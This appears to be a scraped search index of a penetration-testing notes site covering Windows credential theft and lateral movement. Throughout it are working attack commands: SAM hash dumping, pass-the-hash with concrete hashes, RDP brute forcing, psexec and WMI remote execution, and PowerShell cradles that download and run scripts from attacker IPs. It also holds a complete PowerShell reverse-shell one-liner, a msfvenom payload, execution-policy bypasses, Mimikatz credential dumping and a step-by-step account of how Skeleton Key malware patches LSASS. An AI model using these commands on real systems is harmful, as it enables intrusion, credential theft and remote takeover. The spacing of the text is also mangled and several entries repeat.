https://blog.stealthbits.com/extracting-user-password-data-with-mimikatz-dcsync/","title":"Cheatsheet"},{"location":"os/windows/credentials/0-cheatsheed/#cheatsheet","text":"https://github.com/weaknetlabs/Penetration-Testing-Grimoire/blob/master/Privilege%20Escalation/Windows/credential-search.md","title":"Cheatsheet"},{"location":"os/windows/credentials/0-cheatsheed/#stored-credentials","text":"Creates, lists, and deletes stored user names and passwords or credentials. Usable with \"runas /savecred\" cmdkey / list","title":"Stored Credentials"},{"location":"os/windows/credentials/0-cheatsheed/#lm-hashes","text":"Password longer than 7 is split and each half hashed separately Passwords are converted into uppercase No salt Empty LM hash AAD3B435B51404EE aad3b435b51404ee AAD3B435B51404EEAAD3B435B51404EE aad3b435b51404eeaad3b435b51404ee","title":"LM hashes"},{"location":"os/windows/credentials/0-cheatsheed/#ntlm-hashes","text":"Administrator : 500 : aad3b435b51404eeaad3b435b51404ee : 8118 cb8789b3a147c790db402b016a08 ::: ( UID ):( UID NUM ):( LM HASH ):( NT HASH ):( COMMENT ):( USER HOME PATH ):","title":"NTLM hashes"},{"location":"os/windows/credentials/0-cheatsheed/#dumping-hashes","text":"Cannot copy SAM when sys is in use C : \\ reg . exe save hklm \\ sam sam C : \\ reg . exe save hklm \\ security security C : \\ reg . exe save hklm \\ system system Use secretsdump.py to extract","title":"Dumping hashes"},{"location":"os/windows/credentials/0-cheatsheed/#capturing-hashes","text":"","title":"Capturing Hashes"},{"location":"os/windows/credentials/0-cheatsheed/#inveigh","text":"","title":"Inveigh"},{"location":"os/windows/credentials/0-cheatsheed/#impackets-smbserverpy","text":"","title":"Impacket's smbserver.py"},{"location":"os/windows/credentials/0-cheatsheed/#attack-patterns","text":"","title":"Attack Patterns"},{"location":"os/windows/credentials/0-cheatsheed/#pass-the-hash","text":"Auth using username and NTLM hash (since NTLM and LM hashes are not salted) Replace \"no password\" in dump wih empty LM hash Copy admins dumped hash (LM:NTML) export SMBHASH = LM : NTML pth - winexe - U administrator % // ip cmd","title":"Pass the Hash"},{"location":"os/windows/credentials/0-cheatsheed/#pth-winexe","text":"pth - winexe - U jeeves / Administrator % aad3b435b51404eeaad3b435b51404ee : e0fb1fb85756c24235ff238cbe81fe00 // 10 . 10 . 10 . 63 cmd","title":"pth-winexe"},{"location":"os/windows/credentials/0-cheatsheed/#rdp-password-brute-forcing","text":"ncrack - v - f --user administrator -P password.txt rdp://ip,CL=1","title":"RDP Password Brute-forcing"},{"location":"os/windows/credentials/0-cheatsheed/#lsass","text":"","title":"LSASS"},{"location":"os/windows/credentials/0-cheatsheed/#attack-techniques","text":"","title":"Attack Techniques"},{"location":"os/windows/credentials/0-cheatsheed/#dpapi-backup-key","text":"Access to secret keys of all users in a domain (certificate, private key, etc.) Obtaining the never changing DPAPI master key In a domain setup, all master keys are required to decrypt the keys. All master keys are protected using one never renewed key. Backup key protocol can be used (tz) to get this key from DC.","title":"DPAPI Backup Key"},{"location":"os/windows/credentials/0-cheatsheed/#skeleton-key","text":"Actors can use a password of their choosing to authenticate as any user. Skeleton Key is deployed as an in-memory patch on a victim's AD domain controllers to allow the threat actor to authenticate as any user, while legitimate users can continue to authenticate as normal. Ref: https://www.secureworks.com/research/skeleton-key-malware-analysis](https://www.secureworks.com/research/skeleton-key-malware-analysis ) When run, Skeleton Key performs the following tasks: Check for one of the following compatible 64-bit Windows versions. The malware is not compatible with 32-bit Windows versions or with Windows Server versions beginning with Windows Server 2012 (6.2). 6.1 (Windows 2008 R2) 6.0 (Windows Server 2008) 5.2 (Windows 2003 R2) Use the SeDebugPrivilege function to acquire the necessary administrator privileges to write to the Local Security Authority Subsystem Service (LSASS) process. This process controls security functions for the AD domain, including user account authentication. Enumerate available processes to acquire a handle to the LSASS process. Obtain addresses for the authentication-related functions that will be patched: CDLocateCSystem \u2014 located in cryptdll.dll SamIRetrieveMultiplePrimaryCredentials \u2014 located in samsrv.dll SamIRetrievePrimaryCredentials \u2014 located in samsrv.dll Perform OS-specific adjustments using the global variable set during the compatibility check in Step 1. Use the OpenProcess function to acquire a handle to the LSASS process. Reserve and allocate the required memory space to edit and patch the LSASS process's memory. Patch relevant functions based on the operating system: CDLocateCSystem (all compatible Windows versions) SamIRetrieveMultiplePrimaryCredentials (only Windows 2008 R2 (6.1)) SamIRetrievePrimaryCredentials (all compatible Windows versions other than Windows 2008 R2 (6.1)) Skeleton Key performs the following steps to patch each function: Call the VirtualProtectEx function to change the memory protection to allow writing to the required memory allocations (PAGE_EXECUTE_READWRITE, 0x40). This step allows the function's code to be updated in memory. Call the WriteProcessMemory function to change the address of the target function to point to the patched code. This change causes calls to the target function to use the patch instead. Restore the original memory protection by calling VirtualProtectEx with the original memory protection flags. This step is likely to avoid suspicious writable and executable memory allocations.","title":"Skeleton Key"},{"location":"os/windows/credentials/0-cheatsheed/#manipulating-sid","text":"sidHistory can be used to manipulate SID and become domain admin Use SID of the DC to look ad domain admin Use DCSync to get more information","title":"Manipulating SID"},{"location":"os/windows/credentials/0-cheatsheed/#windows-version-dependent-information","text":"","title":"Windows Version Dependent Information"},{"location":"os/windows/credentials/0-cheatsheed/#windows-2000","text":"LSASS contains Plain NTLM / LM hashes Kerberos keys, tickets, session keys, passwords (if not consumed already) Passwords encrypted in memory using 1 byte key (XOR) Key is stored in a secret structure [Tool] MimiLove (not in Mimikatz )","title":"Windows 2000"},{"location":"os/windows/credentials/0-cheatsheed/#windows-xp2003","text":"WDigest provider to auth to Web/SASL/LDAP - RFC2617 Password constantly stays in memory LSA SSO secrets protected by LsaEncryptMemory and unencrypted by LsaUnprotectMemory RC4 DESx Key and IV are stored near the secret in LSASS process TsPks (CredSSP) provider can be added manually in XP Terminal server single sign on Credential delegation for terminal server/PowerShell/Double hop, etc. LiveSSP - For using live account to logon to windows","title":"Windows XP/2003"},{"location":"os/windows/credentials/0-cheatsheed/#windows-vista7","text":"TsPkg (CredSSP support) is available by default Several passwords are constantly in memory LSA SSO secrets protected by LsaEncryptMemory and unencrypted by LsaUnprotectMemory 3DES AES Key and IV are stored near the secret in LSASS process","title":"Windows Vista/7"},{"location":"os/windows/credentials/0-cheatsheed/#windows-881","text":"Clear text domain passwords in Vault When using PIN, Picture or Fingerprint to authenticate Offline access is possible Pass the hash, over pass the hash and pass the ticket for RDP","title":"Windows 8/8.1"},{"location":"os/windows/credentials/0-cheatsheed/#windows-81","text":"WDigest is off by default. No password in memory by default. LSA login session cache cleaner Restricted admin mode for RDP Avoid credentials from getting sent to server Pass the hash, over pass the hash and pass the ticket for RDP (with CredSSP) LSA protection LSASS is a protected process. No memory access provided. Can be bypassed by: A driver Another protected process Protected Users security group No NTLM, WDigest, CredSSP, delegation or SSO Strengthen eKerberos only KB2975625 - Restricted admin is disabled by default","title":"Windows 8.1"},{"location":"os/windows/credentials/0-cheatsheed/#windows-10","text":"VMS introduce for enterprise users Use Crypto HSM approach When Windows Credential Guard is enabled: NTLM hash of the password stored in the memory in \"secure world\", encrypted with a \"session-key\". User will get a blob. When authenticating, user sends the blob with NTLM challenge. Secure world will do the hashing operation and create the NTML challenge response and send the response to the normal world. In Kerberos, process is same (secure-world maintain more keys) Limitations TGS session key is not protected (TGT is protected) Not available in VMs and not enabled by default More to protect: DPAPI SAM / DSRM PAC signature","title":"Windows 10"},{"location":"os/windows/credentials/0-cheatsheed/#references","text":"Extracting User Password Data with Mimikatz DCSync: https://blog.stealthbits.com/extracting-user-password-data-with-mimikatz-dcsync/","title":"References"},{"location":"os/windows/credentials/using-credentials/","text":"Using Credentials Password Spraying auxiliary / scanner / smb / smb_login Send the same credentials to all hosts listening on 445 - msf auxiliary ( smb_login ) services - p 445 - R Can do same with CrackMapExec for a subnet: https://github.com/byt3bl33d3r/CrackMapExec Can use following command to explore: net use \\\\ machine - name / user : username @domainname passwords dir \\\\ machine - name \\ c $ net use Can be detected by using net session Can terminate all session with net use / delete * Some commands, such as net view use the login user-name. .: use runas runas / netonly / user : user @domainname cmd.exe net view \\\\ machine - name / all Verify it uses Kerberos by klist Get shells psexec auxiliary / admin / smb / psexec auxiliary / admin / smb / psexec_comman psexec.py - https://github.com/CoreSecurity/impacket / opt / impacket / examples / psexec . py - hashes aad3b435b51404eeaad3b435b51404ee : 9 e730375b7cbcebf74ae46481e07b0c7 - target - ip 10 . 10 . 10 . 10 PsExec is a light - weight telnet - replacement that lets you execute processes on other systems , complete with full interactivity for console applications , without having to manually install client software \\\\ machinename - u user @domainname - p password cmd . exe - - s to get SYSTEM shell - Use runas to use Kerberos TGT and avoid giving password: runas / netonly / user : user @domainname PsExec . exe \\\\ machinename - u user @domainname cmd . exe Manual Operation - Copy a binary to the ADMIN$ share over SMB ( C : \\ Windows \\ PSEXECSVC . exe . ) - copy example . exe \\\\ machine \\ ADMIN $ - Create a service on the remote matching pointing to the binary - sc \\\\ machine create serviceName binPath = c:\\Windows\\example.exe - Remotely start the service - sc \\\\ machine start serviceName - When exited, stop the service and delete the binary - del \\\\ machine \\ ADMIN $\\ example . exe smbexec.pp Stealthier (does not drop a binary) Creates a service Service File Name contains a command string to execute (%COMSPEC% points to the absolute path of cmd.exe) Echos the command to be executed to a bat file, redirects the stdout and stderr to a Temp file, then executes the bat file and deletes it. Creates a log entry for each command. Use Metasploit web_delivery to send script sc \\\\ machine create serviceName binPath = powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring( http://10.9.122.8:8080/AZPLhG9txdFhS9n ); sc \\\\ machine start serviceName Winexe https://sourceforge.net/projects/winexe/ winexe - U Administrator // 10 . 10 . 10 . 82 cmd . exe Pass the hash pth - winexe - U jeeves / Administrator % aad3b435b51404eeaad3b435b51404ee : e0fb1fb85756c24235ff238cbe81fe00 // 10 . 10 . 10 . 63 cmd wmiexec.py Windows Management Instrumentation (WMI) to launch a semi-interactive shell. WMI is the infrastructure for management data and operations on Windows (like SNMP). without touching disk or creating a new service. wmiexec . py administrator : password @10.10.10.10 wmic computerystem list full / format : list wmic process list / format : list wmic ntdomain list / format : list wmic useraccount list / format : list wmic group list / format : list wmic sysaccount list / format : list - https://techcommunity.microsoft.com/t5/Ask-The-Performance-Team/Useful-WMIC-Queries/ba-p/375023 - https://windowstech.net/wmic-commands/ - Can query remotely. - Logging for WMI events is disabled by default: https://msdn.microsoft.com/en-us/library/windows/desktop/aa826686(v=vs.85).aspx wmic wmic / node : machinename / user : username computerystem list full / format : list - Local admins on a remote machine wmic / node : ordws01 path win32_groupuser where ( groupcomponent = win32_group.name=\\ administrators \\ ,domain=\\ ORDWS01 \\ ) - Who is logged-in: wmic / node : ordws01 path win32_loggedonuser get antecedent - Read nodes from text file: wmic / node : @workstations . txt path win32_loggedonuser get antecedent - Execute command: powershell . exe - NoP - sta - NonI - W Hidden - Enc JABXAEMAPQBOAEUAVwAtAE8AQgBKAGUAQw ... truncated ... wmic / node : ordws01 / user : CSCOU \\ jarrieta path win32_process call create **empire launcher string here** - Used in: - https://github.com/samratashok/nishang - https://github.com/PowerShellMafia/PowerSploit - CrackMapExec - wmiexec.py - wmis pth-wmis pth-wmis doesn\u2019t work on 64 bit Kali, however, pth-wmic works with no issues and apparently this has been a problem since 2013. After downloading the 32 bit version of pth-wmis and the required libraries, we are back up and running. echo iex (New-Object Net.WebClient).DownloadString( http://172.16.67.128:80/6WcepYO ) | iconv --to-code UTF-16LE | base64 -w 0 kaliwmis - 32 - U administrator % badpassword // 10 . 10 . 10 . 10 cmd.exe /c powershell.exe -nop -enc base64-value Windows Remote Management (WinRM) 5985/tcp (HTTP) / 5986/tcp (HTTPS) Allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilizing WMI. Enable: Enable - PSRemoting - Force Set - Item wsman : \\ localhost \\ client \\ trustedhosts * Test if target is configured for WinRM: Test - WSMan machinename Execute command: Invoke - Command - Computer ordws01 - ScriptBlock { ipconfig / all } - credential CSCOU \\ jarrieta - Command line: Enter - PSSession - Computer ordws01 - credential CSCOU \\ jarrieta Force enabling WinRM: PS C : \\ tools \\ SysinternalsSuite . \\ PsExec . exe \\\\ ordws04 - u cscou \\ jarrieta - p nastyCutt3r - h - d powershell . exe enable-psremoting -force CrackMapExec \"-x\" parameter to send commands. wmiexec.py across multiple IPs Using Remote Desktop Impacket's rdp_check to see if you have RDP access, Then use Kali's rdesktop to connect: References https://blog.ropnop.com/using-credentials-to-own-windows-boxes/","title":"Using Credentials"},{"location":"os/windows/credentials/using-credentials/#using-credentials","text":"","title":"Using Credentials"},{"location":"os/windows/credentials/using-credentials/#password-spraying","text":"auxiliary / scanner / smb / smb_login Send the same credentials to all hosts listening on 445 - msf auxiliary ( smb_login ) services - p 445 - R Can do same with CrackMapExec for a subnet: https://github.com/byt3bl33d3r/CrackMapExec Can use following command to explore: net use \\\\ machine - name / user : username @domainname passwords dir \\\\ machine - name \\ c $ net use Can be detected by using net session Can terminate all session with net use / delete * Some commands, such as net view use the login user-name. .: use runas runas / netonly / user : user @domainname cmd.exe net view \\\\ machine - name / all Verify it uses Kerberos by klist","title":"Password Spraying"},{"location":"os/windows/credentials/using-credentials/#get-shells","text":"","title":"Get shells"},{"location":"os/windows/credentials/using-credentials/#psexec","text":"auxiliary / admin / smb / psexec auxiliary / admin / smb / psexec_comman psexec.py - https://github.com/CoreSecurity/impacket / opt / impacket / examples / psexec . py - hashes aad3b435b51404eeaad3b435b51404ee : 9 e730375b7cbcebf74ae46481e07b0c7 - target - ip 10 . 10 . 10 . 10 PsExec is a light - weight telnet - replacement that lets you execute processes on other systems , complete with full interactivity for console applications , without having to manually install client software \\\\ machinename - u user @domainname - p password cmd . exe - - s to get SYSTEM shell - Use runas to use Kerberos TGT and avoid giving password: runas / netonly / user : user @domainname PsExec . exe \\\\ machinename - u user @domainname cmd . exe Manual Operation - Copy a binary to the ADMIN$ share over SMB ( C : \\ Windows \\ PSEXECSVC . exe . ) - copy example . exe \\\\ machine \\ ADMIN $ - Create a service on the remote matching pointing to the binary - sc \\\\ machine create serviceName binPath = c:\\Windows\\example.exe - Remotely start the service - sc \\\\ machine start serviceName - When exited, stop the service and delete the binary - del \\\\ machine \\ ADMIN $\\ example . exe","title":"psexec"},{"location":"os/windows/credentials/using-credentials/#smbexecpp","text":"Stealthier (does not drop a binary) Creates a service Service File Name contains a command string to execute (%COMSPEC% points to the absolute path of cmd.exe) Echos the command to be executed to a bat file, redirects the stdout and stderr to a Temp file, then executes the bat file and deletes it.","title":"smbexec.pp"},{"location":"os/windows/credentials/using-credentials/#creates-a-log-entry-for-each-command","text":"Use Metasploit web_delivery to send script sc \\\\ machine create serviceName binPath = powershell.exe -nop -w hidden -c $k=new-object net.webclient;$k.proxy=[Net.WebRequest]::GetSystemWebProxy();$k.Proxy.Credentials=[Net.CredentialCache]::DefaultCredentials;IEX $k.downloadstring( http://10.9.122.8:8080/AZPLhG9txdFhS9n ); sc \\\\ machine start serviceName","title":"Creates a log entry for each command."},{"location":"os/windows/credentials/using-credentials/#winexe","text":"https://sourceforge.net/projects/winexe/ winexe - U Administrator // 10 . 10 . 10 . 82 cmd . exe","title":"Winexe"},{"location":"os/windows/credentials/using-credentials/#pass-the-hash","text":"pth - winexe - U jeeves / Administrator % aad3b435b51404eeaad3b435b51404ee : e0fb1fb85756c24235ff238cbe81fe00 // 10 . 10 . 10 . 63 cmd","title":"Pass the hash"},{"location":"os/windows/credentials/using-credentials/#wmiexecpy","text":"Windows Management Instrumentation (WMI) to launch a semi-interactive shell. WMI is the infrastructure for management data and operations on Windows (like SNMP). without touching disk or creating a new service. wmiexec . py administrator : password @10.10.10.10 wmic computerystem list full / format : list wmic process list / format : list wmic ntdomain list / format : list wmic useraccount list / format : list wmic group list / format : list wmic sysaccount list / format : list - https://techcommunity.microsoft.com/t5/Ask-The-Performance-Team/Useful-WMIC-Queries/ba-p/375023 - https://windowstech.net/wmic-commands/ - Can query remotely. - Logging for WMI events is disabled by default: https://msdn.microsoft.com/en-us/library/windows/desktop/aa826686(v=vs.85).aspx wmic wmic / node : machinename / user : username computerystem list full / format : list - Local admins on a remote machine wmic / node : ordws01 path win32_groupuser where ( groupcomponent = win32_group.name=\\ administrators \\ ,domain=\\ ORDWS01 \\ ) - Who is logged-in: wmic / node : ordws01 path win32_loggedonuser get antecedent - Read nodes from text file: wmic / node : @workstations . txt path win32_loggedonuser get antecedent - Execute command: powershell . exe - NoP - sta - NonI - W Hidden - Enc JABXAEMAPQBOAEUAVwAtAE8AQgBKAGUAQw ... truncated ... wmic / node : ordws01 / user : CSCOU \\ jarrieta path win32_process call create **empire launcher string here** - Used in: - https://github.com/samratashok/nishang - https://github.com/PowerShellMafia/PowerSploit - CrackMapExec - wmiexec.py - wmis","title":"wmiexec.py"},{"location":"os/windows/credentials/using-credentials/#pth-wmis","text":"pth-wmis doesn\u2019t work on 64 bit Kali, however, pth-wmic works with no issues and apparently this has been a problem since 2013. After downloading the 32 bit version of pth-wmis and the required libraries, we are back up and running. echo iex (New-Object Net.WebClient).DownloadString( http://172.16.67.128:80/6WcepYO ) | iconv --to-code UTF-16LE | base64 -w 0 kaliwmis - 32 - U administrator % badpassword // 10 . 10 . 10 . 10 cmd.exe /c powershell.exe -nop -enc base64-value","title":"pth-wmis"},{"location":"os/windows/credentials/using-credentials/#windows-remote-management-winrm","text":"5985/tcp (HTTP) / 5986/tcp (HTTPS) Allows remote management of Windows machines over HTTP(S) using SOAP. On the backend it's utilizing WMI. Enable: Enable - PSRemoting - Force Set - Item wsman : \\ localhost \\ client \\ trustedhosts * Test if target is configured for WinRM: Test - WSMan machinename Execute command: Invoke - Command - Computer ordws01 - ScriptBlock { ipconfig / all } - credential CSCOU \\ jarrieta - Command line: Enter - PSSession - Computer ordws01 - credential CSCOU \\ jarrieta Force enabling WinRM: PS C : \\ tools \\ SysinternalsSuite . \\ PsExec . exe \\\\ ordws04 - u cscou \\ jarrieta - p nastyCutt3r - h - d powershell . exe enable-psremoting -force","title":"Windows Remote Management (WinRM)"},{"location":"os/windows/credentials/using-credentials/#crackmapexec","text":"\"-x\" parameter to send commands. wmiexec.py across multiple IPs","title":"CrackMapExec"},{"location":"os/windows/credentials/using-credentials/#using-remote-desktop","text":"Impacket's rdp_check to see if you have RDP access, Then use Kali's rdesktop to connect:","title":"Using Remote Desktop"},{"location":"os/windows/credentials/using-credentials/#references","text":"https://blog.ropnop.com/using-credentials-to-own-windows-boxes/","title":"References"},{"location":"os/windows/powershell/0-cheatsheet/","text":"Cheatsheet Using command line (why not run direcrly???) echo IEX ( New - Object Net . WebClient ). DownloadString ( http://10.10.14.17:8000/Sherlock.ps1 ) | PowerShell - Noprofile - Versions v1: November 2006 - Windows XP SP2, Windows Server 2003 SP1 and Windows Vista v2: Windows 7 and Windows Server 2008 R2 (Standalone for: Windows XP SP3, Windows Server 2003 SP2, and Windows Vista SP1) v3: Windows 8 (Can be installed on: Windows 7 SP1, for Windows Server 2008 SP1, and for Windows Server 2008 R2 SP1) (no XP support) v4: Windows 8.1 (Can be installed on: Windows 7 SP1, for Windows Server 2008 SP1, and for Windows Server 2008 R2 SP1) v5: Part of Windows Management Framework (WMF) 5.0. February 24, 2016. Features OneGet PowerShell cmdlets to support Chocolatey's repository-based apps. Ability to manage layer 2 network switches Windows 10 Anniversary Update Available for Windows 7, Windows Server 2008, Windows Server 2008 R2, Windows Server 2012, and Windows Server 2012 R2 v6: PowerShell Core on 18 August 2016 Get - Host | Select - Object Version $ PSVersionTable References https://pinvoke.net - Allowing developers to find, edit and add PInvoke * signatures, user-defined types, and any other information related to calling Win32 and other unmanaged APIs from managed code (written in languages such as C# or VB.NET). An A-Z Index of Windows PowerShell commands: https://ss64.com/ps/ Windows PowerShell command line syntax: https://ss64.com/ps/syntax.html Help System Versin information: $ PSVersionTable Get - Help Get - Process help Get - Process Update - Help Get - Help remoting Get - Help about_ * remot * 64 bit %SystemRoot%\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe IEX(New-Object Net.Webclient).DownloadString( http://10.10.14.17/Invoke-PowerShellTcp.ps1 ) 32 bit START / MIN / LOW CMD / C % SystemRoot % \\ system32 \\ WindowsPowerShell \\ v1 . 0 \\ powershell . exe IEX(New-Object Net.Webclient).DownloadString( http://10.11.0.50/shells/Invoke-PowerShellTcp.ps1 ) Basic Constructs Cmdlets Function List all Cmdlets Get - Command - CommandTyle Cmdlet Aliases Get - Alias - Name ps Get - Alias - Definition Get - Process Check Environment C : \\ WIndows \\ Syswow64 \\ Windowspowershell \\ v1 . 0 \\ powershell . exe PSModulePath Version info: powershell - v 2 . 0 - c $ psversiontable Language mode: $ host . runspace . languagemode Check if AppLocker is enabled: Get - AppLockerPolicy - Local Powershell Version: ( Get - Host ). Version 64bit version: %SystemRoot%\\sysnative\\WindowsPowerShell\\v1.0\\powershell.exe Download Files powershell wget http://example.com/abc.txt -outfile abc.txt Invoke-WebRequest -Uri http://192.168.0.17/PS_TCP4.ps1 -OutFile $fullpath ; powershell - c Invoke-WebRequest -Uri http://10.10.15.150/41020.exe -OutFile C:\\Users\\kostas\\Desktop\\41020.exe echo $ webclient = New - Object System . Net . WebClient wget . ps1 echo $ url = http://10.10.10.10/example.exe wget . ps1 echo $ file = example.exe wget . ps1 echo $ webclient . DownloadFile ( $ url , $ file ) wget . ps1 powershell . exe - ExecutionPolicy Bypass - NoLogo - NonInterative - NoProfile - File wget . ps1 Base64 encoded payload delivery echo iex (New-Object Net.WebClient).DownloadString( http://172.16.67.128:80/6WcepYO ) | iconv --to-code UTF-16LE | base64 -w 0 kaliwmis - 32 - U administrator % badpassword // 10 . 10 . 10 . 10 cmd.exe /c powershell.exe -nop -enc base64-value Execution Policy powershell.exe -exec Bypass Not a security feature Used to avoid accidental script execution Can be bypass with: powershell - ExecutionPolicy bypass . \\ example . ps1 powershell - c cmd powershell - EncodedCommand cmd powershell - enc cmd $ env : PSExecutionPolicyPreference = bypass Ref https://docs.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies?view=powershell-6 15 ways to bypass PowerShell execution policy: https://www.netspi.com/blog/entryid/238/15-ways-to-bypass-the-powershell-execution-policy Revserse Shell Start-Process -FilePath \u201c powershell \u201d -argumentlist \u201c IEX ( New-Object Net . WebClient ). downloadString ( \u2018 http : // 10 . 10 . 14 . 30 / adminshell . ps1 \u2019 ) \u201d -Credential $cred msfvenom -a x86 - -platform Windows -p windows / exec CMD = powershell -c iex(new-object net.webclient).downloadstring( http://10.10.14.159/Invoke-PowerShellTcp-8082.ps1 ) -e x86 / unicode_mixed -b \\x00\\x80\\x81\\x82\\x83\\x84\\x85\\x86\\x87\\x88\\x89\\x8a\\x8b\\x8c\\x8d\\x8e\\x8f\\x90\\x91\\x92\\x93\\x94\\x95\\x96\\x97\\x98\\x99\\x9a\\x9b\\x9c\\x9d\\x9e\\x9f\\xa0\\xa1\\xa2\\xa3\\xa4\\xa5\\xa6\\xa7\\xa8\\xa9\\xaa\\xab\\xac\\xad\\xae\\xaf\\xb0\\xb1\\xb2\\xb3\\xb4\\xb5\\xb6\\xb7\\xb8\\xb9\\xba\\xbb\\xbc\\xbd\\xbe\\xbf\\xc0\\xc1\\xc2\\xc3\\xc4\\xc5\\xc6\\xc7\\xc8\\xc9\\xca\\xcb\\xcc\\xcd\\xce\\xcf\\xd0\\xd1\\xd2\\xd3\\xd4\\xd5\\xd6\\xd7\\xd8\\xd9\\xda\\xdb\\xdc\\xdd\\xde\\xdf\\xe0\\xe1\\xe2\\xe3\\xe4\\xe5\\xe6\\xe7\\xe8\\xe9\\xea\\xeb\\xec\\xed\\xee\\xef\\xf0\\xf1\\xf2\\xf3\\xf4\\xf5\\xf6\\xf7\\xf8\\xf9\\xfa\\xfb\\xfc\\xfd\\xfe\\xff BufferRegister = EAX -f python shellcode http://www.labofapenetrationtester.com/2015/05/week-of-powershell-shells-day-1.html $client = New-Object System . Net . Sockets . TCPClient ( 10.10.10.10 , 80 ); $stream = $client . GetStream (); [byte[]] $bytes = 0 .. 65535 |%{ 0 }; while (( $i = $stream . Read ( $bytes , 0 , $bytes . Length )) -ne 0 ){; $data = ( New-Object -TypeName System . Text . ASCIIEncoding ). GetString ( $bytes , 0 , $i ); $sendback = ( iex $data 2 1 | Out-String ); $sendback2 = $sendback + PS + ( pwd ). Path + ; $sendbyte = ( [text.encoding] :: ASCII ). GetBytes ( $sendback2 ); $stream . Write ( $sendbyte , 0 , $sendbyte . Length ); $stream . Flush ()}; $client . Close () Modules Import - Module path_to_module - verbose List all available modules: Get - Module - ListAvailable - All List all modules available in: $ env : PSModulePath All functions exposed by a module: Get - Command - Module module_name Remote Script execution Invoke-Expression ( New-Object Net . WebClient ) . DownloadString ( http://example.com/example.ps1 ); iex ( New-Object Net . WebClient ) . DownloadString ( http://example.com/example.ps1 ); powershell - EncodedCommand Base64EncodedCommand START / B powershell -c IEX ( New-Object Net . Webclient ). downloadstring ( http://10.10.14.2/shell.ps1 ) /B prevents creation of a new window Craft Download Cradles: https://github.com/danielbohannon/Invoke-CradleCrafter More Download Cradles $ ie = New-Object -ComObject InternetExplorer . Application ;$ ie . visible =$ False ;$ ie . navigate ( http://example.com/example.ps1 ); sleep 5 ;$ resp =$ ie . Document . Body . innerHTML ;$ ie . quit (); iex $ resp iex ( iwr http://example.com/example.ps1 ) $ h = New - Object - ComObject Msxm12 . XMLHTTP ;$h.open( GET , http://192.168.230.1/evil.psi1 ,$false);$h.send();iex $h. responseText $wr [System.NET.WebRequest] :: Create ( http://192.168.230.1/evil.psi ) $r = $wr . GetResponse () IEX ( [System.IO.StreamReader] ( $r . GetResponseStream ())) . ReadToEnd ()``` Command History (PSReadline) cat ( Get - PSReadlineOption ). HistorySavePath | sls password By default, the path is: profile : \\ AppData \\ Roaming \\ Microsoft \\ Windows \\ PowerShell \\ PSReadline \\ ConsoleHost_history . txt Powershell Remoting Enabled by default from Windows Server 2012 Enable - PSRemoting - Force Admin privileges are required to connect Get - Command - CommandType cmdlet - ParameterName computername Get-Command -CommandType cmdlet | Where-Object { $_Parameters.Keys -- contains ComputerName - and $_Parameters.Keys -- contains Credential - and $_Parameters.Keys -- notcontains Session } WSMAN (WebServicesManagement) Protocol (WinRM) WinRM is Microsoft\u2019s implementation of WSMAN Port 5985, 5986 If target is in a workgroup, attacker's machine should trust target machine to send out credentials: Set-Item WSMan:\\localhost\\client\\trustedhosts -Value * Invoke-Command -ScriptBlock { $env : ComputerName } -ComputerName example -Credential dominName/userName - FilePath Invoke - WSManAction - Action Create - ResourceURI wmicimv2 / win32_process - ValueSet @ { commandline = powershell.exe -c Get-Process } - ComputerName domainpc \u2013 Credential Invoke - WSManAction - Action Create - ResourceURI wmicimv2 / win32_process - ValueSet @ { commandline = powershell.exe -c iex ((New-Object Net.Webclient).DownloadString( http://192.168.254. 1/reverse_powershell.ps1 )) } - ComputerName domainpc WSMAN vs PowerShell Remoting vs WMI WSMAN Firewall friendly Use HTTP and HTTPS ports Syntax is complex Returns immutable objects Can be used with non-Windows machines Powershell Remoting Firewall friendly Easy use Returns immutable objects WMI Not firewall friendly Not NAT friendly Complex Returns editable objects One to One Invoke - Command is stateless for stageful operations use PSSession Interactive, stateful session Run in a new process wsmprovhost New-PSSession $ ses = New - PSSession - ComputerName name - Credential cred Get - PSSession Enter - PSSession Define a function in a remote machine and call it: Invoke - Command - ScriptBlock { function Example1 { whoami ; }} - Session $ ses Invoke - Command - ScriptBlock { Example1 } - Session $ ses PSSession - CommandName Example1 - Session $ ses Export a command from a remote machine: Export - PSSession - Module name - CommandName Example1 - Session $ ses Double Hop Problem (Attacker delegate sending token to target-2 from target-1) Enable - WSManCredSSP - Role Client - DelegateComputer Enable - WSManCredSSP - Role Server Get - WSManCredSSP Enter - PSSession - ComputerName name - Credential cred - Authentication CredSSP Useful cmdlets New-PSSession Enter-PSSession Set - MpPreference - DisableRealtimeMonitoring $ true New - PSSession - ComputerName instance $ sess = New - PSSession - ComputerName instance Enter - PSSEssion - Session $ sess One to Many (Fan-out Remoting) Non-interactive Parallel command execution Can execute scripts from files Usable to perform command execution without dropping exe onto disk Useful for passing and replying hashes, tickets and other AD attacks Run commands: Invoke - Command - ScriptBlock { whoami ; hostname } - ComputerName instance Run scripts: Invoke - Command - FilePath example . ps1 - ComputerName instance Run functions installed on the remote box: Invoke-Command -ScriptBlock ${ function : Invoke - Mimikatz } -ComputerName instance Stateful commands: $sess = New-PSSession -ComputerName instance Invoke-Command -Session $sess -ScriptBlock { $proc = Get - Process } Invoke-Command -Session $sess -ScriptBlock { $proc.Name } Mimikatz (ReflectivePEInjection is used to load into memory) Invoke - Mimikatz - DumpCreds Invoke - Mimikatz - DumpCerts Pass the Hash Invoke - Mimikatz - Command sekurlsa::pth /user: name_of_the_user /domain:. /ntlm: ntlmhash /run:powershell.exe Invoke - Mimikatz - Command sekurlsa::pth /user:Administrator /domain:. /ntlm: ntlmhash /run:powershell.exe Dump Creds from multiple machines Invoke - Mimikatz - DumpCreds - ComputerName @ ( instance1 , instance2 ) Load PowerUp powershell - ExecutionPolicy Bypass Import - Module . / PowerUp . ps1 Invoke - AllChecks Active Directory [ADSI] Get member of the domain admin group ( [ ADSI ] LDAP://cn=Domain Admin,cn=Users,dc=Example,dc=com ). Members Get memberships of a user ( [ ADSI ] LDAP://cn=Administrator,cn=Users,dc=Example,dc=com ). MemberOf .NET Class: System . DirectoryServices . ActiveDirectory Native Executable WMI System Information Get - HotFix Jobs Start - Job - ScriptBlock { whoami } Start - Job - FilePath path Get - Job | Receive - Job Get - Job - id id | Receive - Job Remove - Job Get - Command - ParameterName AsJob Run job on a remote machine using PSSession or by using - AsJob with - ComputerName . With - AsJob it's 